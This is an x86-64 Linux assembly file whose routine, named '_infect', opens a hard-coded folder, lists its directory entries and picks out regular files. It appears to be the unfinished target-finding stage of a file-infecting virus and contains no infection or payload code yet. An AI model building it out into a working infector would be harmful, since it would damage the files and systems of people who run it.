%include "header.asm"
[BITS 64]

section .text
    global _infect

_infect:
    ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
    push rbp
    mov rbp, rsp
    sub rsp, FILE_SIZE + LINUX_DIRENT

folder_1:
    call open_dir
    db FOLDER_1, 0

; folder_2:
;     xor r10, r10
;     call open_dir 
;     db FOLDER_2, 0

open_dir:
    pop rdi
    ; mov [rsp], rdi                          ; early path
    mov rsi, 0                              ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                              ; Quit if cannot OPEN
    jle quit    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 32                             ; offset struct dirent
    mov rdx, 1024
    syscall
    mov r8, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                            ; buffer offset

find_file:
    cmp rbx, r8
    jge quit
    lea rsi, [rsp + 32]                     ; struct
    add rsi, rbx                            ; current offset
    add rsi, LDIRENT_64 + d_type            ; offset d_type
    cmp byte [rsi], 0x8                     ; DT_REG
    jne next

%ifdef DEBUG
    mov rdi, 1
    lea  rsi, [rsp + 32 + rbx + LDIRENT_64 + d_name]

    xor rdx, rdx
    lea rdx, [rsp + 32 + rbx]                                   ; start of current dirent
    movzx rax, byte [rsp + 32 + rbx + LDIRENT_64 + d_reclen]    ; size of current dirent
    add rdx, rax                                                ; start addr of next dirent

    lea rax, [rsp + 32 + rbx + LDIRENT_64 + d_name]             ;
    sub rdx, rax
    mov rax, SYS_WRITE
    syscall

    mov rdi, 1
    mov [rsi], byte 0xa
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
%endif

next:
    movzx r9, word [rsp + 32 + rbx + LDIRENT_64 + d_reclen]               ; offset dirent + offset + d_reclen
    ; CHECK WHEN NO MORE FILES
    add rbx, r9
    jmp find_file

; next_folder:
;     cmp r10, 0
;     jg folder_2


quit:
    mov rax, SYS_EXIT
    mov rdi, 0
    syscall
